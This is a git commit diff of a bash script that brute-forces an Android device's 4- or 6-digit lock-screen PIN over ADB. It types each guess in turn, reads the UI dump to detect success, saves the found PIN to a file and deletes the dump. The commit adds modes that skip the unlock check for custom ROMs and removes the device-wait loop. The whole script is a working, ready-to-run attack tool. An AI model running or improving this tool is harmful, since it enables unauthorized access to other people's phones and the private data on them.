867d615b976dd69ca483a453a0887528d9dd8d08
ArastaD0t <38872983+ArastaD0t@users.noreply.github.com>
2022-03-26 14:26:20 +0000

    Add files via upload

--- main.sh
+++ main.sh
@@ -5,22 +5,24 @@ alias ScreenOn='adb shell input keyevent 26'
 alias Enter='adb shell input keyevent 66'
 alias EnterPass='adb shell input keyevent 82'
 #############################################
-Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
+#Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
 
-while [ $Connected != "device" ] ;
-do
-clear
-echo "[ADB] Waiting for device... "
-sleep 2
-clear
-echo "[ADB] Waiting for device.."
-sleep 1
-clear 
-echo "[ADB] Waiting for device."
-clear 
-Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
-done
-echo "[ADB] Connected !"
+#while [ $Connected != "device" ] ;
+#do
+#clear
+#echo "[ADB] Waiting for device... "
+#sleep 2
+#clear
+#echo "[ADB] Waiting for device.."
+#sleep 1
+#clear 
+#echo "[ADB] Waiting for device."
+#sleep 1
+#clear 
+#Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
+#done
+#echo "[ADB] Connected !"
+
 ScreenOn
 echo "[ADB] Screen on"
 EnterPass
@@ -31,12 +33,15 @@ echo "[APC] How much digits is on screen ?"
 echo "#####################################"
 echo "  1) 4-Digits"
 echo "  2) 6-Digits"
- 
-read n
+echo "  3) 4-Digits WUC  ( Without Unlock Check: good for custom roms) " 
+echo "  4) 6-Digits WUC  ( Without Unlock Check: good for custom roms) "
+echo "  5) Quit"
+
+read selected
 clear
-case $n in
+case $selected in
   1)
-	echo "[AFC] selected 4-Digits"
+	echo "[APC] selected 4-Digits mode"
 	gen=9999
 	EnterPass
 
@@ -46,14 +51,14 @@ then
    while [ True ];
 		do
 		gen=$(($gen-1)) 
-		echo "[AFC] trying $gen"
+		echo "[APC] trying $gen"
 		Text $gen
 		Enter
                 adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin"
                 then echo ""
                 else 
-                   echo "[AFC] UNLOCKED with $gen !" 
+                   echo "[APC] UNLOCKED with $gen !" 
                    touch  $gen.is.pin
                    adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                    break
@@ -64,7 +69,7 @@ fi
 
 	;;
   2) 
-	echo "[AFC] selected 6-Digits"
+	echo "[APC] selected 6-Digits mode"
 	gen=999999
 	EnterPass
 
@@ -73,14 +78,14 @@ then
    while [ True ];
                 do
                 gen=$(($gen-1)) 
-		echo "[AFC] Trying $gen"
+		echo "[APC] Trying $gen"
                 Text $gen
                 Enter
 		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin" 
                 then echo ""
                 else 
-		   echo "[AFC] UNLOCKED with $gen !" 
+		   echo "[APC] UNLOCKED with $gen !" 
 		   touch  $gen.is.pin
 		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
 	  	   break
@@ -94,7 +99,50 @@ fi
 
 
 	;;
-  *) echo "[AFC] invalid option"
+  3)
+	echo "[APC] selected 4-Digits WUC mode"
+	gen=9999
+	EnterPass
+
+
+if [ True ]
+then
+   while [ True ];
+		do
+    echo "[APC] You must check screen yourself..."
+		gen=$(($gen-1)) 
+		echo "[APC] trying $gen"
+		Text $gen
+		Enter
+    sleep 3
+done
+fi
+
+	;;
+  4) 
+	echo "[APC] selected 6-Digits WUC mode"
+	gen=999999
+	EnterPass
+
+if [ True ]
+then
+   while [ True ];
+                do
+                echo "[APC] You must check screen yourself..."
+                gen=$(($gen-1)) 
+		echo "[APC] Trying $gen"
+                Text $gen
+                Enter
+                sleep 3
+done
+fi  
+
+
+  ;;
+  5)
+    exit
+	;;
+  *) echo "[APC] invalid option"
    ./main.sh
 	;;
 esac
